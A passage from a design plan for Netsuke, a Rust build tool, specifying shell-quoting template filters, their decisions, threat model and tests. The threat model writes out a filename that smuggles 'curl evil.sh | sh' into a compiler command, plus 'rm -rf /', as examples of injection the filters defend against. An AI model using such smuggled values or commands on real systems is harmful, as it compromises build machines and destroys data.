  remove**" the `shell_escape` name; this removes it by superseding it.
  Date/Author: 2026-09-08, planning session, confirmed by the requester.
- **Decision D2 (proposed deviation from `RFC-0006-8.9`)**: `shell_quote` and
  `shell_join` accept `dialect='sh'` **and** `dialect='powershell'`, and
  default to the dialect implied by the active `RecipeShell` rather than always
  to `sh`. Rationale: `RFC-0006-8.9` says "`dialect` currently accepts only
  `sh`, matching the single `shell-quote` feature Netsuke enables." That
  premise is false in the code as it stands. `UG-WIN` and
  `src/recipe_shell.rs:18-27` establish that the default Windows recipe
  interpreter is Windows PowerShell, and
  `src/ir/cmd_interpolate/mod.rs:137-150` already implements a second,
  non-`shell-quote` dialect for exactly that case. Shipping an `sh`-only filter
  would emit POSIX quoting into a PowerShell recipe, which is a silent
  injection-safety defect in the very helper whose stated purpose (`DD-4.5`) is
  to be "a non-negotiable security feature to prevent command injection
  vulnerabilities". Affected identifiers: `RFC-0006-8.9`, `RFC-0006-13.3`,
  `RM-6.8.3`, `DD-4.5`. Impacts: `docs/rfcs/0006-…md` §8.9 must be amended to
  record the two-dialect set and the host-default rule; `RM-6.8.3` is reduced
  to a no-op. Options considered: (a) two dialects with a host default —
  chosen; (b) `sh` only, raising a template error on a PowerShell host —
  rejected because it makes the filter unusable in default Windows manifests;
  (c) `sh` only with no platform awareness — rejected as silently unsafe.
  Approving authority: the requester, who selected option (a) and D1 explicitly
  before this plan was written. Date/Author: 2026-09-08, planning session.
- **Decision D3**: `dialect='bash'` is **not** accepted. `RecipeShell::Bash`
  maps to the `sh` dialect, because `shell_quote`'s `Sh` output is documented
  as "a lowest common denominator for Bash, Z Shell, and `/bin/sh`-like
  shells". Rationale: the `shell-quote` crate's `Bash` type emits a *different*,
  `$'...'`-style encoding that Netsuke does not compile in (`Cargo.toml:137`
  enables only `sh`). Accepting the name now would lock in a meaning that a
  future `bash` dialect would have to break. Date/Author: 2026-09-08, planning
  session.
- **Decision D4 (revised; the original premise was false)**: `default` and
  `dialect` are read as `Kwargs::get::<Option<Value>>` and type-checked
  explicitly. The first draft used `Kwargs::get::<Option<String>>` believing it
  raises a type error for a non-string. It does not. Verified against
  `minijinja 2.24.0`, it silently stringifies every value kind: `default=1`
  yields `"1"`, `default=true` yields the Python-shaped `"True"`, and
  `default=['a','b']` yields the JSON fragment `["a", "b"]` — straight into a
  shell recipe. That is exactly the coercion
  `docs/rfcs/0006-ansible-inspired-template-standard-library.md:325` §6.6
  forbids: "A helper that expects a string rejects numbers and booleans rather
  than stringifying them." The read is therefore:

  ```rust
  let fallback = match kwargs.get::<Option<Value>>("default")? {
      None => None,
      Some(value) => Some(
          value
              .as_str()
              .ok_or_else(|| default_not_string_error(value.kind()))?
              .to_owned(),
      ),
  };
  ```

  The original draft of this decision carried a third arm,
  `Some(value) if value.is_undefined() => return Err(undefined_default_error())`.
  That arm is **unreachable**, and was removed during EP-M1.
  `impl ArgType for Option<T>` maps absent, `none`, *and* undefined alike onto
  `Ok(None)` (`minijinja-2.24.0/src/value/argtypes.rs:530-544`), so by the time
  the match runs, an undefined `default` is indistinguishable from an omitted
  one. The distinction is harmless — all three mean "no fallback" — but the
  two-arm form is what ships.

  `default=none` remains equivalent to omitting `default`, because `env`'s
  fallback is an absence substitution rather than a value slot; that is the one
  place RFC 0006's null rule is deliberately not followed, and the user guide
  says so. A defined non-string value is an error. This costs one message key
  the first draft claimed to save. Buying a silent-coercion defect for
  thirty-five lines of translation was a bad trade. Date/Author: 2026-09-09,
  revised after contract review; the undefined arm removed 2026-09-19 during
  EP-M1.
- **Decision D5**: `compact` drops `none`, undefined, and the empty string, and
  keeps `0`, `false`, `[]`, and `{}`. Rationale: `DD-4.5` says exactly "removes
  empty strings and null values while preserving order". Dropping
  falsy-but-present values would silently discard a meaningful `0` from a flag
  list. Date/Author: 2026-09-08, planning session.
- **Decision D6 (rationale corrected)**: `shell_quote` and `shell_join` are
  registered on the manifest-query surface as *working* helpers, not disabled
  stubs. Rationale: they are pure **with respect to the supplied dialect**. The
  first draft claimed they "read no environment state", which is false: with
  `dialect` omitted they resolve through `RecipeShell::host_default()`, itself
  `cfg!(windows)` (`src/recipe_shell.rs:18-27`), and after EP-M4 from
  `NETSUKE_WINDOWS_SHELL`. So `{{ 'a b' | shell_quote }}` on the query surface
  discloses the host OS family. That is an accepted residual — the family is
  already inferable from the binary and from `netsuke --version` — but
  non-disclosure is the one property `register_manifest_query` exists to
  guarantee, so its rationale must be accurate rather than convenient. Given an
  explicit `dialect`, the filters read nothing at all. `compact` is
  unconditionally pure and lands automatically, because
  `collections::register_filters` is already called by both surfaces
  (`src/stdlib/register.rs:156-164` and `:169`). Date/Author: 2026-09-09,
  corrected after structural review.
- **Decision D7**: `ortho_config` is not used. See "Applicability of
  `ortho_config`" above. Date/Author: 2026-09-08, planning session.

- **Decision D8**: `compact` and `shell_join` reject by `ValueKind`, not by
  `Value::try_iter()`. Rationale: the first draft claimed non-sequence input
  "errors through `values.try_iter()?`, exactly as `uniq` does". That is false.
  `minijinja-2.24.0/src/value/mod.rs::try_iter` accepts `None` and `Undefined`
  (yielding an empty iterator), any string (yielding its *characters*), and any
  object (a map yields its *keys*); only numbers and booleans are rejected. So
  `{{ 'abc' | shell_join }}` would quote three separate characters into a
  command line, and `{{ my_map | compact }}` would silently return the map's
  keys. Both helpers therefore accept only `ValueKind::Seq` and
  `ValueKind::Iterable`; every other kind, `Map`, `String`, `None`, and
  `Undefined` included, raises an error naming the received kind. `uniq` and
  `flatten` share the latent wart; fixing them is out of scope, but it is not a
  licence to add two more, one of which builds shell text. Date/Author:
  2026-09-09, after contract review.
- **Decision D9**: every new diagnostic carries a machine-readable code in its
  Fluent text: `[netsuke::jinja::shell::args]` for a wrong call, and
  `[netsuke::jinja::shell::unquotable]` for a value a recipe cannot carry.
  Rationale: `locales/en-GB/messages.ftl:342-346` already carries
  `[netsuke::jinja::which::args]` inside the message, and `locales/fr` keeps it
  verbatim while translating the prose. It is the crate's only locale-stable
  handle for a template diagnostic, and `tests/features/stdlib.feature:104-106`
  proves the suite switches locale. The first draft's behavioural scenarios
  asserted on untranslated English (`"line feed"`), which would fail in
  thirty-two of the thirty-five catalogues. The split matters: `::args` means
  the template is wrong, and `::unquotable` means the template is right but its
  data cannot be carried — different fixes, often by different people. Do
  **not** copy `with_not_found_code` (`src/stdlib/which/mod.rs:235-237`), which
  prefixes the code in Rust *and* in the Fluent text; the snapshot at
  `tests/snapshots/which_diagnostic_snapshot_tests__which_not_found.snap:5`
  shows it emitted twice. The code lives in the message text only. Date/Author:
  2026-09-09, after contract review.
- **Decision D10**: `dialect='sh'` names an *encoding*, not a shell. Its output
  is fixed and will not change when further dialects are added. The dialect
  selected when `dialect` is *omitted* is a host- and configuration-dependent
  default that MAY change between Netsuke releases — in particular
  `RecipeShell::Bash` maps to `sh` today (D3) and would map to a future `bash`
  dialect. A manifest whose generated text must be byte-stable across releases
  and hosts must pin `dialect=` explicitly. Rationale: this is the one axis of
  the template surface with no versioning story, and it is invisible: no
  manifest edit, no version bump, different `build.ninja`. Naming it is cheaper
  than discovering it. Date/Author: 2026-09-09, after contract review.
- **Decision D11 (alternative considered and not adopted)**: ship
  `shell_quote`/`shell_join` with **no** `dialect` argument, always following
  the active recipe shell. Rationale for considering it: every comparable tool —
  `shlex.quote`, `shlex.join`, Just's `quote()`, bazel-skylib's `shell.quote`,
  Nix's `escapeShellArg`, Ansible's `quote` — ships a one-argument function
  with no dialect selector. Dropping it would remove four of the six message
  keys (roughly 140 catalogue lines), remove `ShellDialect::parse`, remove
  OBL-DIALECT-TOTAL, and remove the name collision with ADR-019's shell
  registry, which accepts `bash` where D3 rejects it. It would also make RFC
  0006's wider dialect set *easier* to add later, since an optional keyword on
  a zero-argument filter is purely additive. Rationale for not adopting it: the
  requester chose the two-dialect surface explicitly, and `RFC-0006-8.9` plus
  `RM-6.8.3` both specify the `dialect` argument by name. Dropping it would be
  a second deviation on top of D2. The plan instead adopts the safety half of
  the argument: the documented example and every snapshot pin `dialect`
  explicitly (R4), D10 records that the omitted-dialect default is unstable,
  and EP-M4 closes the mismatch that made the argument dangerous. Reopening
  condition: if the requester prefers the smaller surface at approval time,
  EP-M3 and EP-M4 shrink by roughly forty per cent and R1 drops from high to
  low likelihood. This decision is cheap to reverse before EP-M4 and expensive
  afterwards, because the template surface becomes documented and executed at
  EP-M5. Date/Author: 2026-09-09, after alternatives review.
- **Decision D12**: `shell_quote` and `shell_join` are *safe primitives*, not
  enforced controls, and the plan says so rather than repeating `DD-4.5`'s
  "non-negotiable security feature" unqualified. See "Threat model" below.
  Date/Author: 2026-09-09, after contract review.

## Threat model

`DD-4.5` calls the quoting filter "a non-negotiable security feature to prevent
command injection vulnerabilities". That phrase needs qualifying before it is
repeated, because a security property requires an attacker and no document in
this repository names one.

**The attacker is not the manifest author.**
`docs/stdlib-yaml-and-jinja-guide.md:89,319,383` is unambiguous that
host-observing helpers belong only in trusted manifests. An author who wants
arbitrary execution writes `command: rm -rf /`. `shell_quote` defends against
nothing there.

**The attacker is whoever controls a value a trusted manifest reads and
interpolates.** Netsuke gives a manifest at least seven such channels, every
one of them lower-trust than the manifest itself:

| Channel                               | Who controls the value                                 |
| ------------------------------------- | ------------------------------------------------------ |
| `env('X')`                            | whoever sets CI job variables or the developer's shell |
| `glob('src/*.c')`                     | anyone who can add a file to the checkout              |
| `contents(...)`, `size`, `linecount`  | whoever wrote the file                                 |
| `fetch(url)`                          | the remote server, or anyone who can poison it         |
| `value \| shell(cmd)`, `\| grep(...)` | whatever the subprocess prints                         |
| `which('tool')`                       | whoever can plant a `PATH` entry                       |

The realistic attack: a contributor opens a pull request adding a file named
`x; curl evil.sh | sh; #.c`; the manifest does
`command: cc {{ glob('src/*.c') | join(' ') }}`; continuous integration builds
the pull request. Interpolated *paths* are already covered — `quote_path` quotes
`{{ ins }}` and `{{ outs }}`. `shell_quote` extends that guarantee to the
other six channels, which today have nothing.

**What this plan delivers, honestly.**

- For `dialect='sh'`, a sound encoder, with unusually good evidence:
  OBL-SH-ROUNDTRIP runs a real `/bin/sh` and has a stated negative control, and
  the encoding composes correctly with ADR-014's `$`-doubling at the Ninja
  writer boundary.
- For `dialect='powershell'` on a non-Windows host, one class weaker: the
  guarantee rests on a handwritten inverse model until the Windows job runs.
  ADR-041 must say so in those words.
- **It is opt-in and silent when omitted.** Nothing detects
  `command: cc {{ glob(...) | join(' ') }}` and warns. A control that works
  only when the author remembers it is a primitive, not a control.
- **It does not cover the command or option position.**
  `{{ tool | shell_quote }} {{ user_flags }}` is still injectable through
  `user_flags`. The guide must not let an author believe that quoting one
  substitution makes a recipe safe.

The claim to write in ADR-041 and in "Validation and acceptance", replacing any
unqualified repetition of `DD-4.5`:

> `shell_quote` and `shell_join` are safe primitives, not enforced controls.
> They give a manifest author a sound way to interpolate a value into a shell
> recipe as exactly one inert word. The threat they address is a trusted
> manifest interpolating an attacker-influenced value. The manifest itself
> remains trusted input; nothing here defends against a hostile `Netsukefile`.
> The soundness of the encoder is non-negotiable; its application is the
> author's responsibility. A lint that flags an unquoted interpolation of a
> host-observing helper's result into a recipe is deliberately out of scope and
> should be raised as a separate roadmap item.

## Interfaces and dependencies

Be prescriptive. At the end of this work the following must exist.

### `src/shell_word.rs` (new leaf)

The encoder does **not** go into `src/recipe_shell.rs`. That module's own doc
comment calls it "intentionally below both IR lowering and Ninja rendering" and
"data-only": it is the shared vocabulary type three layers agree on, and giving
it a `shell_quote` dependency would change its character. Instead add a leaf
that both `src/ir/` and `src/stdlib/` may depend on, and leave `recipe_shell`
pure:

```rust
//! Encode one string as a single shell word for a named dialect.

/// The shell dialect a word is encoded for.
#[derive(Clone, Copy, Debug, Eq, PartialEq)]
pub(crate) enum ShellDialect {
    /// POSIX `sh` word quoting, also correct for Bash and Z Shell.
    Sh,
    /// Windows PowerShell single-quoted string quoting.
    PowerShell,
}

impl ShellDialect {
    /// Every dialect, in the order errors enumerate them.
    pub(crate) const ALL: &'static [Self] = &[Self::Sh, Self::PowerShell];

    /// Return the `dialect` keyword-argument spelling of this dialect.
    pub(crate) const fn as_str(self) -> &'static str;

    /// Parse one `dialect` keyword argument, case-insensitively.
    ///
    /// Deliberately rejects `bash`. See decision D3: `RecipeShell::Bash` maps
    /// to `Sh` because `Sh` output is valid Bash, but the `shell-quote` crate's
    /// `Bash` encoder emits a different `$'...'` form that Netsuke does not
    /// compile in. Accepting the name now would lock in a meaning a real
    /// `bash` dialect would have to break.
    pub(crate) fn parse(raw: &str) -> Option<Self>;
}

/// Encode `value` as one shell word for `dialect`, without validating it.
///
/// This function is total: the caller owns the question of which inputs a
/// recipe may carry. `quote_path` depends on that split to keep its existing
/// total behaviour.
pub(crate) fn quote_word(dialect: ShellDialect, value: &str) -> String;
```

`ALL`, `as_str`, and `parse` derive from one another, so adding a third dialect
is a one-line enum change rather than an edit at every use site.

`quote_word`'s body is moved verbatim from
`src/ir/cmd_interpolate/mod.rs::quote_path`, generalized from `&Utf8PathBuf` to
`&str`.

### `src/recipe_shell.rs`

Stays a single file and stays data-only. It gains exactly one method, so that
the mapping lives with the type that knows about all three interpreters:

```rust
/// Return the dialect whose quoting rules this interpreter follows.
///
/// `Posix` and `Bash` share `Sh`: they differ in transport, not in lexis.
pub(crate) const fn dialect(self) -> ShellDialect;
```

There is deliberately **no** inverse. `RecipeShell -> ShellDialect` is a
three-to-two surjection, so a `ShellDialect::recipe_shell` would have to pick
one of `Posix`/`Bash` arbitrarily and its doc comment could not be truthful.
`src/stdlib/` never names `RecipeShell`; every edge points downward into
`shell_word`.

### `src/stdlib/recipe_text/` (new)

Not `src/shell_word.rs` and `src/stdlib/recipe_text/`. `src/stdlib/command/`
already registers a template filter literally named `shell`
(`src/stdlib/command/mod.rs:81-111`) and already contains a `quote.rs`. A
sibling `shell/` module holding `shell_quote` would invert the naming at both
ends: a contributor grepping `stdlib/shell` for the `shell` filter would find
text quoting, and grepping `stdlib/command` for `shell_quote` would find
`cmd.exe` quoting. Name the module for what it produces.

In the same milestone, rename `src/stdlib/command/quote.rs` to
`child_argument.rs` and its `quote` function to `quote_child_argument`. Both are
`pub(super)` with a single consumer (`format_command` in
`src/stdlib/command/filters.rs:126-149`), so the rename is free and it removes
the last bare `quote` in the subtree.

`src/stdlib/recipe_text/mod.rs`:

```rust
/// Register the pure recipe-text filters on an environment.
pub(crate) fn register_filters(env: &mut Environment<'_>, default: ShellDialect);
```

It registers exactly two filters:

- `value | shell_quote(dialect=<name>)`
- `values | shell_join(dialect=<name>)`

Both read `dialect` with `kwargs.get::<Option<Value>>("dialect")?` and
type-check it as a string, per D4 — the `Option<String>` read would stringify a
non-string rather than raise. They then fall back to `default`, and finish with
`kwargs.assert_all_used()?`, matching the ordering in
`src/stdlib/which/mod.rs:82-92`.

Both call the shared admissibility predicate before encoding — see the next
subsection — and then `shell_word::quote_word`. `shell_join` joins the encoded
words with one space.

### Control characters: reuse, do not reimplement

The first draft of this plan proposed a `policy.rs` owning a "rejects `\0`,
`\r`, `\n`" rule. That rule already exists: `src/ninja_gen_escape.rs:43-48`:

```rust
/// Reject text that cannot remain within one Ninja binding.
pub(super) fn validate_ninja_value(text: &str) -> Result<(), NinjaGenError> {
    if text.contains(['\n', '\r', '\0']) {
        return Err(NinjaGenError::UnsafeNinjaValue);
    }
    Ok(())
}
```

`docs/adr-014-backend-text-escaping-seam.md` records it as the Ninja writer's
own admissibility rule. Reimplementing it inside a template filter would put
one predicate at three enforcement points, and they have **already** drifted:
`src/stdlib/command/quote.rs:43` rejects `\n` and `\r` but not `\0`.

Instead, promote the predicate to a shared leaf and call it from both places.
Add to `src/shell_word.rs`:

```rust
/// Report whether `value` can survive as part of a single-line recipe.
///
/// Newline, carriage return, and NUL cannot: a Ninja binding is single-line by
/// construction. This is the same rule the Ninja writer enforces at its own
/// boundary; see ADR-014.
pub(crate) fn is_recipe_admissible(value: &str) -> bool { !value.contains(['\n', '\r', '\0']) }
```

`validate_ninja_value` becomes a caller of it. The template filters call it and
raise the localized `stdlib.shell.quote.control_character` diagnostic, so an
author gets an error naming their expression rather than a backend-attributed
one. `src/stdlib/command/quote.rs`'s narrower rule is left alone and its
divergence documented, because a `cmd.exe` argument is not recipe text.

This removes the `QuotePolicyError` type and one of the five message keys was
already going to be needed for it, so the key count is unchanged.

### Enforcing "exactly one implementation"

Constraint 4 is currently prose. Make it a gate. `shell_quote::QuoteRefExt` is
imported at exactly two sites today (`src/ir/cmd_interpolate/mod.rs:12` and
`src/stdlib/command/quote.rs:6`), and `clippy.toml:15-24` already uses
`disallowed-methods` with reason strings to enforce the ADR-008 environment
mandate, with sanctioned sites carrying
`#[expect(clippy::disallowed_methods, reason = "...")]` so the exemption warns
once it becomes obsolete. Add one entry:

```toml
{ path = "shell_quote::QuoteRefExt::quoted", reason = "recipe-shell word quoting lives in shell_word::quote_word" },
```

with one `#[expect(...)]` in `src/shell_word.rs` and one in
`src/stdlib/command/child_argument.rs`, whose divergence is deliberate. One
line of configuration turns an aspiration into a check, using machinery the
repository already trusts.

### `src/stdlib/collections.rs`

`register_filters` gains one line, and the file gains two functions:

```rust
env.add_filter("compact", |values: Value| compact_filter(&values));

/// Report whether a member is dropped by `compact`.
///
/// Only `none`, undefined, and the empty string are blank. `0`, `false`, `[]`,
/// `{}`, and a whitespace-only string are values and are retained; naming the
/// predicate keeps that asymmetry visible to the next reader.
fn is_blank(value: &Value) -> bool;

/// Drop blank members from a sequence, preserving order.
///
/// # Errors
///
/// Returns an error naming the received kind when the subject is not a
/// sequence. See decision D8: `Value::try_iter()` is not a sequence check.
fn compact_filter(values: &Value) -> Result<Value, Error>;
```

`src/stdlib/collections.rs` is 314 lines today, so `compact` fits. If it would
exceed 400, convert it to a directory module with
`src/stdlib/collections/compact.rs`.

### `src/stdlib/config/`

The configuration stores the **dialect**, not the interpreter. `StdlibConfig`
does not care which interpreter runs the recipe; it cares which quoting rule to
apply, and `RecipeShell` is a three-variant type that would be collapsed to two
immediately. Storing the wider type would leave a `recipe_shell()` accessor
inviting a question the configuration can no longer answer honestly, because
`Posix` and `Bash` are indistinguishable downstream.

The field is declared on `StdlibConfig` in `config/mod.rs`, but the builder and
accessor live in a sibling `config/recipe_shell.rs`, following the clustering
`config/which.rs` and `config/ambient.rs` already use. This is a deviation from
the original text, which placed them in `config/mod.rs`: that file was at 383
lines against AGENTS.md's 400-line cap, and the addition pushed it to 405. As
delivered, `config/mod.rs` returns to 393 and the sibling holds the rest.

```rust
/// Shell dialect the recipe-text filters quote for.
dialect: ShellDialect,

/// Select the recipe interpreter whose quoting rules the filters follow.
///
/// The interpreter is collapsed to its dialect on the way in: `Posix` and
/// `Bash` both quote as `sh`. Only the dialect is stored, because nothing
/// downstream can distinguish the two.
#[must_use]
pub fn with_recipe_shell(mut self, shell: RecipeShell) -> Self {
    self.dialect = shell.dialect();
    self
}

/// Return the dialect the recipe-text filters quote for.
///
/// Compiled in test builds only until EP-M4 supplies the caller.
#[cfg(test)]
pub(crate) const fn dialect(&self) -> ShellDialect;
```

The `#[cfg(test)]` on the accessor is deliberate and temporary. EP-M3's Green
step requires the field and the builder, and its tests read the field back
through the accessor; but a `pub(crate)` item with no production reader is dead
code, and no attribute marks it dormant truthfully — the tests would make a
`dead_code` *expectation* unfulfilled in the `--all-targets` profile the gates
run, while the same expectation in the lib-only profile is fulfilled. The `pub`
builder has no such problem, because `pub` items are never dead. EP-M4 removes
the gate in the commit that registers the filters.

`StdlibConfig::new` initializes it to `RecipeShell::host_default().dialect()`.

`RecipeShell` is already publicly nameable — `src/lib.rs:27` declares
`pub mod recipe_shell;` and the enum is `pub` — so `with_recipe_shell` needs no
visibility widening, and `ShellDialect` stays `pub(crate)`. Taking
`RecipeShell` as the *parameter* also keeps the interpreter-to-dialect mapping
in one place rather than pushing it out to every caller.

### `src/stdlib/register.rs`

- `register_read_only_helpers` calls
  `recipe_text::register_filters(env, config.dialect())`.
- `register_query_helpers` calls
  `recipe_text::register_filters(env, RecipeShell::host_default().dialect())`.

  **Known divergence, deliberately accepted.** On a Windows host with
  `NETSUKE_WINDOWS_SHELL=bash`, the build surface receives the resolved dialect
  while the query surface receives the host default, so `netsuke help targets`
  renders different quoting from the build for the same expression. Query
  rendering is discovery metadata and is never executed, so the divergence is
  harmless — but it must be pinned by an assertion in
  `tests/stdlib_manifest_query_tests.rs` and recorded in
  `docs/developers-guide.md`, not discovered later. The alternative — hoisting
  `resolve_recipe_shell()` above the early return at
  `src/runner/mod.rs:130-160` — would make `netsuke help targets` fail on a
  Windows host with a malformed `NETSUKE_WINDOWS_SHELL`, which is a worse trade.

- The disabled `env` stub changes to:

  ```rust
  env.add_function(
      "env",
      |_variable: String, _kwargs: Kwargs| -> Result<String, Error> {
          Err(manifest_query_operation_error("env"))
      },
  );
  ```

### `src/manifest/mod.rs` — the extraction has already landed

**The extraction this plan's first draft scheduled as a prerequisite has
already happened on `origin/main`.** `src/manifest/registration.rs` exists at
`0ba6672f` with exactly the four planned members (`RESERVED_VAR_NAMES`,
`localize_recipe_error`, `register_manifest_vars`, `manifest_structure_error`),
and `src/manifest/mod.rs` has fallen from exactly 400 lines — the constraint-8
cap, with zero headroom — to 259. The plan's choice of module name and member
set was correct, and R9's collision became a convergence. EP-M1 step 1 is
therefore deleted: there is nothing to extract, only a module to extend.

Constraint 8 is still live, so the headroom matters. Test it before editing
rather than trusting this paragraph:
`wc -l src/manifest/mod.rs src/manifest/registration.rs` and
`wc -l src/manifest/render.rs` — the last is now **exactly 400**, so it has no
headroom at all and EP-M4 must not add a line to it.

Move the `env` and `glob` registrations out of `src/manifest/mod.rs` and into
`src/manifest/registration.rs` as part of EP-M1. The registration itself, in
`src/manifest/registration.rs`:

```rust
let reader = Arc::clone(env_reader);
let policy_for_env_lookup = env_access_policy.clone();
jinja.add_function("env", move |var_name: String, kwargs: Kwargs| {
    let fallback = env_default_from_kwargs(&kwargs)?;
    kwargs.assert_all_used()?;
    env_var_with_default(&var_name, &policy_for_env_lookup, fallback, |key| {
        reader(key)
    })
});
```

```rust
/// Read the optional `default` keyword argument as a string.
///
/// Reads `Option<Value>` rather than `Option<String>` because `MiniJinja`'s
/// `Option<String>` conversion silently stringifies numbers, booleans,
/// sequences, and mappings. See decision D4.
///
/// # Errors
///
/// Returns an error for a defined, non-string `default`. An explicit `none`
/// is equivalent to omitting the argument, as is an undefined value: the
/// `Option<Value>` read maps absent, `none`, and undefined alike onto `None`,
/// so no branch can distinguish them. See D4's EP-M1 note.
fn env_default_from_kwargs(kwargs: &Kwargs) -> Result<Option<String>, Error>;
```

### `src/manifest/env_reader.rs`

The landed signature at `0ba6672f` is
`env_var_with(name: &str, policy: &EnvAccessPolicy, read_env)`, which evaluates
the ADR-026 access policy *before* reading. EP-M1 adds the `fallback` parameter
and must keep the policy evaluation first: a blocked name must not reach the
reader even when a `default` is supplied, or `default=` becomes a policy
bypass. Preserve the policy argument's position and the existing
`ManifestEnvironment` bundle; see R9.

```rust
/// Read one environment variable, substituting `fallback` only for absence.
///
/// # Errors
///
/// Returns an `UndefinedError` when the variable is absent and `fallback` is
/// `None`, and an `InvalidOperation` error when the value is not valid UTF-8 —
/// the latter regardless of `fallback`, because a present-but-undecodable value
/// is a configuration fault, not an absence. A name the access policy blocks
/// fails before the reader is called, with or without a `fallback`.
pub(super) fn env_var_with_default(
    name: &str,
    policy: &EnvAccessPolicy,
    fallback: Option<String>,
    read_env: impl FnOnce(&str) -> Result<String, EnvReadError>,
) -> Result<String, Error>;
```

On the substitution path it emits, mirroring the existing failure-path logging
at `src/manifest/env_reader.rs:139,152,162` and naming neither the variable nor
the value:

```rust
tracing::debug!(fallback_used = true, "manifest env lookup substituted default");
```

Without it, a continuous-integration job whose `RUSTFLAGS` export silently
stops propagating goes from failing fast to building the wrong artefact with no
record anywhere that a default was taken. See R10.

`env_var_with` is **renamed**, not kept as an alias (constraint 7). Note the
change from the plan's original wording: the landed function already takes the
policy, so this is a three-argument-to-four-argument edit in place, and the
argument count crosses `clippy.toml`'s `too-many-arguments-threshold = 4` only
if a fifth is added. Prefer threading a small struct over adding a fifth
argument.

### `src/manifest/env_telemetry.rs`

New on `origin/main` and relevant to EP-M1. It owns the single telemetry point
for every `env()` lookup, `record_env_lookup(outcome, result)`, with the closed
outcome vocabulary `success`/`blocked`/`not_present`/`not_unicode` exported as
`ENV_LOOKUP_OUTCOME_VALUES` for the application recorder's admission check.

A substituted default is **not** a fifth outcome and must not become one: the
lookup genuinely succeeded, and `success` is what an operator counting
substitutions wants to *add to*, not replace. Whether EP-M5's
`netsuke_manifest_env_default_substituted_total` counter is worth its keep is a
question for EP-M1 to answer with evidence, since the `tracing::debug!` above
already records the event. If it ships, it is admitted through
`src/observability_recorder.rs`'s `accepts_name` and
`accepts_counter_registration` (see the counters section under EP-M5).

### New localization keys

Every diagnostic carries its machine-readable code in the Fluent text, per D9
and matching `locales/en-GB/messages.ftl:342-346`. Added to
`src/localization/keys.rs` in the `STDLIB_*` group, after the `COMMAND_*` block:

```rust
STDLIB_SHELL_ARGS_ERROR => "stdlib.shell.args_error",
STDLIB_SHELL_UNQUOTABLE => "stdlib.shell.unquotable",
STDLIB_SHELL_QUOTE_NOT_STRING => "stdlib.shell.quote.not_string",
STDLIB_SHELL_QUOTE_CONTROL_CHARACTER => "stdlib.shell.quote.control_character",
STDLIB_SHELL_DIALECT_INVALID => "stdlib.shell.dialect_invalid",
STDLIB_SHELL_JOIN_NOT_SEQUENCE => "stdlib.shell.join.not_sequence",
STDLIB_SHELL_JOIN_ITEM_NOT_STRING => "stdlib.shell.join.item_not_string",
STDLIB_SHELL_POSITIONAL_OPTION => "stdlib.shell.positional_option",
STDLIB_COLLECTIONS_COMPACT_NOT_SEQUENCE
    => "stdlib.collections.compact.not_sequence",
MANIFEST_ENV_ARGS_ERROR => "manifest.env.args_error",
MANIFEST_ENV_DEFAULT_NOT_STRING => "manifest.env.default_not_string",
```

English text (`locales/en-GB/messages.ftl` and `locales/en-US/messages.ftl`):

```text
stdlib.shell.args_error = [netsuke::jinja::shell::args] { $details }
stdlib.shell.unquotable = [netsuke::jinja::shell::unquotable] { $details }
stdlib.shell.quote.not_string = shell_quote expects a string, received { $kind }.
stdlib.shell.quote.control_character = A value containing a null byte, carriage return, or line feed cannot be quoted.
stdlib.shell.dialect_invalid = Unknown shell dialect { $dialect }; expected one of { $accepted }.
stdlib.shell.join.not_sequence = shell_join expects a sequence, received { $kind }.
stdlib.shell.join.item_not_string = shell_join item { $index } is { $kind }, not a string.
stdlib.shell.positional_option = { $filter } takes its options by keyword; write { $example }.
stdlib.collections.compact.not_sequence = compact expects a sequence, received { $kind }.
manifest.env.args_error = [netsuke::jinja::env::args] { $details }
manifest.env.default_not_string = env default must be a string, received { $kind }.
```

The first two are wrappers; the rest are details fed through them as
`{ $details }`, exactly as `stdlib.which.cwd_mode_invalid` feeds
`stdlib.which.args_error` through `args_message`
(`src/stdlib/which/mod.rs:262-266`). `stdlib.shell.unquotable` wraps the
control-character detail; every other shell detail wraps
`stdlib.shell.args_error`, and the `env` detail wraps
`manifest.env.args_error`. The existing `manifest.env.missing` and
`manifest.env.invalid_utf8` messages are **not** given codes: constraint 1
freezes their rendered text.

The `{ $variable }` name set must be identical in all 35 catalogues; wording
and order may differ, but the bracketed code must be copied verbatim, as
`locales/fr/messages.ftl:343-347` does today. Follow
`docs/localization-styleguide.md`.

Eleven keys, not five. The first draft had five and was wrong on two counts: D4
and D8 each need a key the draft claimed to save, and D9 adds the two wrappers
that make the diagnostics locale-stable. Roughly 385 catalogue lines. See R1.

## Verification plan

Verification is co-designed with the implementation: the split between
`is_recipe_admissible` (whether a value may be quoted) and `quote_word` (how it
is encoded) — both in `src/shell_word.rs`, not in the `policy.rs`/`quoting.rs`
pair an earlier draft proposed — exists precisely so the encoding obligation
can be discharged against a real shell while the policy obligation stays a
cheap total function.

### Non-trivial axioms

- **AXIOM-1**: `shell_quote::Sh` emits text that a POSIX `sh` decodes back to
  the input byte string. This is a third-party contract; it is *exercised*, not
  proven, by OBL-SH-ROUNDTRIP running a real `/bin/sh`.
- **AXIOM-2**: Windows PowerShell decodes a single-quoted string by collapsing
  each `''` to `'` and treating every other character literally. Exercised
  against real `powershell.exe` only on Windows hosts; discharged against an
  explicit inverse model elsewhere. Residual gap recorded below.
- **AXIOM-3**: `shlex::split` implements POSIX word splitting faithfully enough
  to serve as an oracle for "this text is exactly one word".
  `docs/formal-verification-methods-in-netsuke.md:277` records that whether
  `shlex::split` is part of the semantic acceptance contract or only a guard is
  an open question; this plan uses it only as a *test oracle*, alongside the
  real-shell round trip, never as the sole evidence.
- **AXIOM-4 (corrected)**: MiniJinja's `Kwargs::get::<Option<Value>>` yields
  `None` for an absent key, for an explicit `none`, and for an explicit
  undefined — all three collapse to "no value" — and yields `Some(value)` only
  for a **defined** argument. There is therefore no way to tell an absent key
  from an explicit `none` after the read, which is why no `is_none`/
  `is_undefined` guard can fire on the returned `Value` (see D4 and the
  `Surprises & discoveries` entry for the vendored-source evidence);
  `assert_all_used` rejects unconsumed *keyword* arguments with a message
  containing "unknown keyword argument". A trailing **positional** argument is
  different: it yields a bare `TooManyArguments` with **no detail**, naming
  neither the filter nor the expected keyword. The first draft assumed
  `Option<String>` raises on a type mismatch; it does not, it stringifies (D4).
  All three behaviours are exercised: the unknown-keyword case, the
  non-string-`default` case, and the positional case.
- **AXIOM-5**: A Ninja `command =` value is single-line, so rejecting `\r` and
  `\n` loses no expressible manifest.

Verus is not used: `docs/roadmap.md:428-433` records the accepted phase-1
boundary that Verus is "optional and proof-kernel-only". Kani is not used
either: the invariants below are over unbounded UTF-8 strings, where a bounded
